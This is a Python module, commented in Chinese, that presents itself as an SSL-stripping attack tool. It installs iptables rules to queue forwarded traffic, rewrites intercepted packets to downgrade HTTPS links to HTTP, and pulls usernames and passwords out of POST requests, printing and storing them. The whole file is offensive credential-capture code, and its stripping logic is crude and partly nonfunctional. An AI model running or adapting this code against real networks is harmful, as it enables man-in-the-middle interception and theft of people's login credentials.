#!/usr/bin/env python3
"""
SSL剥离攻击模块
将HTTPS连接降级为HTTP，以便捕获明文密码
"""

import netfilterqueue
from scapy.all import IP, TCP, Raw
import re
import threading
import time

class SSLStripper:
    def __init__(self):
        """初始化SSL剥离器"""
        self.stripping = False
        self.queue = None
        self.queue_num = 0
        self.captured_credentials = []
    
    def process_packet(self, packet):
        """处理数据包，进行SSL剥离"""
        try:
            scapy_packet = IP(packet.get_payload())
            
            if scapy_packet.haslayer(Raw):
                load = scapy_packet[Raw].load.decode('utf-8', errors='ignore')
                
                # 检测HTTPS请求并降级为HTTP
                if scapy_packet.haslayer(TCP):
                    # 修改Host头，将https改为http
                    if 'Host:' in load:
                        load = load.replace('https://', 'http://')
                        load = load.replace('HTTP/1.1', 'HTTP/1.0')
                        
                        # 重新构建数据包
                        scapy_packet[Raw].load = load.encode()
                        del scapy_packet[IP].len
                        del scapy_packet[IP].chksum
                        del scapy_packet[TCP].chksum
                        
                        packet.set_payload(bytes(scapy_packet))
                    
                    # 捕获POST请求中的凭据
                    if 'POST' in load and ('password' in load.lower() or 'login' in load.lower()):
                        self._extract_credentials(load)
            
            packet.accept()
        except Exception as e:
            packet.accept()
    
    def _extract_credentials(self, data):
        """从HTTP POST数据中提取凭据"""
        try:
            # 尝试提取用户名和密码
            username_match = re.search(r'(?:user|username|email|login)=([^&]+)', data, re.IGNORECASE)
            password_match = re.search(r'password=([^&]+)', data, re.IGNORECASE)
            
            if username_match or password_match:
                username = username_match.group(1) if username_match else "N/A"
                password = password_match.group(1) if password_match else "N/A"
                
                credential = {
                    'username': username,
                    'password': password,
                    'timestamp': time.time()
                }
                
                self.captured_credentials.append(credential)
                print(f"[+] 捕获到凭据: {username} / {password}")
        except Exception as e:
            pass
    
    def start(self, queue_num=0):
        """
        开始SSL剥离
        
        Args:
            queue_num: netfilterqueue队列号
        """
        if self.stripping:
            return False
        
        try:
            import time
            self.queue_num = queue_num
            self.queue = netfilterqueue.NetfilterQueue()
            self.queue.bind(queue_num, self.process_packet)
            self.stripping = True
            
            # 设置iptables规则
            import subprocess
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', 
                          '-p', 'tcp', '--destination-port', '80', 
                          '-j', 'REDIRECT', '--to-port', '10000'], check=False)
            subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', 
                          '--queue-num', str(queue_num)], check=True)
            
            print(f"[+] SSL剥离已启动 (队列: {queue_num})")
            
            # 在后台线程中运行队列
            queue_thread = threading.Thread(target=self.queue.run, daemon=True)
            queue_thread.start()
            
            return True
        except Exception as e:
            print(f"启动SSL剥离错误: {e}")
            print("提示: 需要root权限，并且需要安装netfilterqueue")
            return False
    
    def stop(self):
        """停止SSL剥离"""
        if not self.stripping:
            return False
        
        try:
            self.stripping = False
            if self.queue:
                self.queue.unbind()
            
            # 删除iptables规则
            import subprocess
            subprocess.run(['iptables', '-t', 'nat', '-D', 'PREROUTING', 
                          '-p', 'tcp', '--destination-port', '80', 
                          '-j', 'REDIRECT', '--to-port', '10000'], check=False)
            subprocess.run(['iptables', '-D', 'FORWARD', '-j', 'NFQUEUE', 
                          '--queue-num', str(self.queue_num)], check=False)
            
            print("[+] SSL剥离已停止")
            return True
        except Exception as e:
            print(f"停止SSL剥离错误: {e}")
            return False
    
    def get_captured_credentials(self):
        """获取捕获的凭据"""
        return self.captured_credentials

